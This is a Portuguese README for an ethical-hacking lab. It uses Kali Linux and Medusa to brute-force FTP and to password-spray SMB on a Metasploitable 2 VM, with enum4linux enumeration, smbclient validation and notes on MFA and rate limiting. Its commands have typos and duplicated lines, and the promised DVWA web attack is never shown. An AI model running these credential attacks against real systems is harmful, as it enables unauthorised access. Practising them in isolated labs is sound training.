# Projeto-pr-tico-utilizando-Kali-Linux-e-a-ferramenta-Medusa
Implementar, documentar e compartilhar um projeto prático utilizando Kali Linux e a ferramenta Medusa, em conjunto com ambientes vulneráveis (por exemplo, Metasploitable 2 e DVWA), para simular cenários de ataque de força bruta e exercitar medidas de prevenção.

**Configurar o ambiente: duas VMs (Kali Linux e Metasploitable 2) no VirtualBox, com rede interna (host-only).**
Executar ataques simulados: força bruta em FTP, automação de tentativas em formulário web (DVWA) e password spraying em SMB com enumeração de usuários.

**link oficial para baixar o Kali Linux**
https://www.kali.org/

**link oficial para baixar metasploitable 2**
https://sourceforge.net/projects/metasploitable/files/


**Esse é um excelente exercício prático de Hacking Ético! Ele cobre todas as etapas reais de um teste de penetração focado em engenharia social/força bruta: reconhecimento, preparação de dicionários (wordlists), ataque, exploração e pós-exploração.**


**Passo 1**: Criação das Wordlists (Usuários e Senhas)O Medusa precisa de dois arquivos de texto simples para testar as transferências. No terminal do seu Kali Linux, crie esses arquivos:

**Criando Arquivos de Usuários e Senhas Comandos Comuns utilizados:**
(IP utizado ou que foi descoberto na máquina Metasploitable 2)

echo -e "user\nmsfadmin\nadmin\root" > users.txt
echo -e "123456\nsenha\nqwerty\nmsfadmin" > pass.txt
medusa -h 192.168.254.3 -U users.txt -P pass.txt -M ftp -t 6
medusa -h 192.168.254.3 -U users.txt -P pass.txt -M ftp -t 6

**Criação de Listas de Palavras**

echo -e "users\nmffadmin\nadimin\nroot" > users.txt

**Criação  de Word Lists**

echo -e "user\nmfadmin\nadmin\nroot" > users.txt 

echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

echo -e "user\nmsfadmin\nadmin\nroot" > users.txt


**Passo 2:** Execução do Ataque de Força Bruta com a Medusa O Medusa é uma ferramenta de login paralelo muito rápida.

Ataques de Força Bruta em Formulários de Login Web 
(IP utilizado ou que foi descoberto na máquina Metasploitable 2)

http://192.168.254.3/dvwa/login.php

**Ataque em Cadeia:** 

**Enumeração SMB e Password Spraying Simulando um Cenário Corporativo Mal Configurado** 
(IP utizado ou que foi descoberto na máquina Metasploitable 2)

enum4linux -a 192.168.254.3 | tee enum4_output.txt

less enum4_output.txt

**Criando uma lista de usuários**
(IP utizado ou que foi descoberto na máquina Metasploitable 2)

echo -e "user\nmsfadmin\nservice" > smb_users.txt

echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt

medusa -h 192.168.254.3 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50 

**O que vai acontecer: A Medusa testará as especificações em paralelo. Quando ele encontrou a combinação correta (msfadmin / msfadmin), ele exibirá a palavra SUCCESS.**


**Passo 3: Validação do Acesso com o smbclient Testando o acesso utilizando Smbclient** 

(IP utizado ou que foi descoberto na máquina Metasploitable 2)

smbclient -L //192.168.254.3 -U msfadmin


**Se o acesso for validado, o Kali listará pastas compartilhadas do sistema alvo (como print$, tmp, opt, etc.), provando que você agora tem acesso aos arquivos corporativos simulados ali.**


**Passo 4:** Base Teórica para Conclusão do Projeto

**Por que ferramentas clássicas (Medusa/Hydra) ainda são essenciais?** Porque em redes internas corporativas (Active Directory/Intranets), protocolos antigos como SMB, SSH e RDP frequentemente não possuem limites de tentativas de login ativados por padrão, permitindo que automações descubram credenciais em segundos.

**O papel do MFA (Múltiplo Fator de Autenticação):** O MFA neutralizaria esse ataque específico. Mesmo que o Medusa descobrisse a senha do SMB, o invasor seria bloqueado na falta do segundo fator (como um token no celular).

**Limitações em Interfaces Web Modernas:** Interfaces web atuais possuem mecanismos de Rate Limiting (bloqueio por excesso de tentativas), CAPTCHAs e WAF (Web Application Firewall). Por isso, atacantes preferem focar em serviços de infraestrutura (como o SMB) que costumam ser esquecidos pelos administradores.

**Mitigação de Falsos-Positivos:** No Medusa, falsos-positivos ocorrem se o servidor começar a responder "sucesso" para tudo devido a um travamento ou configuração de "conta convidado" ativa. Validar manualmente com o smbclient (Passo 3) é a melhor prática para confirmar se o acesso é real.Ficou claro como executar os comandos do Medusa e do smbclient no Kali? Se você rodar o ataque agora e encontrar qualquer comportamento estranho ou erro no terminal, me envie o texto do erro para corrigirmos na hora!







